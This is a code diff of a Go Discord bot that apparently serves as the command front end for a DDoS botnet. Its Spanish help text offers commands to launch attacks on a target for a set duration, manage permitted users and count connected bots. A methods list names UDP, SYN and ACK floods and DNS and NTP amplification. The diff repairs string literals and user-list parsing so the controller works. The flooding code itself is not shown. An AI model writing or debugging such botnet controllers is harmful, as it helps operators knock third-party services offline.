@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bufio"
 	"fmt"
 	"log"
 	"os"
@@ -34,7 +35,6 @@ func init() {
 	Token = os.Getenv("DISCORD_TOKEN")
 	if Token == "" {
 		log.Fatal("Error: DISCORD_TOKEN no está definido en las variables de entorno.")
-		return
 	}
 
 	// Cargar el ID del owner desde las variables de entorno
@@ -49,34 +49,30 @@ func init() {
 
 // ayudaCommand
 func ayudaCommand(s *discordgo.Session, m *discordgo.MessageCreate) {
-	message := `
-**Lista de comandos:**
-*   \`!ayuda\`: Muestra esta lista de comandos.
-*   \`!methods\`: Muestra los métodos de ataque disponibles.
-*   \`!adduser <usuario>\`: Agrega un usuario a la lista de usuarios permitidos (solo para el owner).
-*   \`!deleteuser <usuario>\`: Elimina un usuario de la lista de usuarios permitidos (solo para el owner).
-*   \`!ataque <método> <objetivo> <duración>\`: Inicia un ataque DDoS (requiere permisos).
-*   \`!bots\`: Muestra la cantidad de bots conectados (solo para el owner).
-	`
+	message := "**Lista de comandos:**\n" +
+		"*   `!ayuda`: Muestra esta lista de comandos.\n" +
+		"*   `!methods`: Muestra los métodos de ataque disponibles.\n" +
+		"*   `!adduser <usuario>`: Agrega un usuario a la lista de usuarios permitidos (solo para el owner).\n" +
+		"*   `!deleteuser <usuario>`: Elimina un usuario de la lista de usuarios permitidos (solo para el owner).\n" +
+		"*   `!ataque <método> <objetivo> <duración>`: Inicia un ataque DDoS (requiere permisos).\n" +
+		"*   `!bots`: Muestra la cantidad de bots conectados (solo para el owner).\n"
 	s.ChannelMessageSend(m.ChannelID, message)
 }
 
 // methodsCommand
 func methodsCommand(s *discordgo.Session, m *discordgo.MessageCreate) {
-	message := `
-**Métodos de ataque disponibles:**
-*   \`udp-pps\`: UDP Flood (paquetes por segundo)
-*   \`udp-sockets\`: UDP Flood (sockets múltiples)
-*   \`udp-query\`: UDP Query Flood
-*   \`udp-bypass\`: UDP Bypass
-*   \`tcp-ack\`: TCP ACK Flood
-*   \`tcp-syn\`: TCP SYN Flood
-*   \`dns\`: DNS Flood
-*   \`ntp\`: NTP Flood
-*   \`dns-amp\`: DNS Amplification Attack
-*   \`ntp-amp\`: NTP Amplification Attack
-*   \`mix-amp\`: Ataque de amplificación mixto
-	`
+	message := "**Métodos de ataque disponibles:**\n" +
+		"*   `udp-pps`: UDP Flood (paquetes por segundo)\n" +
+		"*   `udp-sockets`: UDP Flood (sockets múltiples)\n" +
+		"*   `udp-query`: UDP Query Flood\n" +
+		"*   `udp-bypass`: UDP Bypass\n" +
+		"*   `tcp-ack`: TCP ACK Flood\n" +
+		"*   `tcp-syn`: TCP SYN Flood\n" +
+		"*   `dns`: DNS Flood\n" +
+		"*   `ntp`: NTP Flood\n" +
+		"*   `dns-amp`: DNS Amplification Attack\n" +
+		"*   `ntp-amp`: NTP Amplification Attack\n" +
+		"*   `mix-amp`: Ataque de amplificación mixto\n"
 	s.ChannelMessageSend(m.ChannelID, message)
 }
 
@@ -238,17 +234,19 @@ func loadAllowedUsers() {
 	}
 	defer file.Close()
 
-	var users []string
-	_, err = fmt.Fscanln(file, &users) // Corregido: Usar Fscanln para leer líneas completas
-	if err != nil {
-		log.Printf("Error al leer el archivo de usuarios permitidos: %s\n", err)
-		return
-	}
+	scanner := bufio.NewScanner(file)
 
 	allowedUsersMu.Lock()
 	defer allowedUsersMu.Unlock()
-	for _, user := range users {
-		allowedUsers[user] = true
+	for scanner.Scan() {
+		line := strings.TrimSpace(scanner.Text())
+		if line == "" {
+			continue
+		}
+		allowedUsers[line] = true
+	}
+	if err := scanner.Err(); err != nil {
+		log.Printf("Error al leer el archivo de usuarios permitidos: %s\n", err)
 	}
 }
 
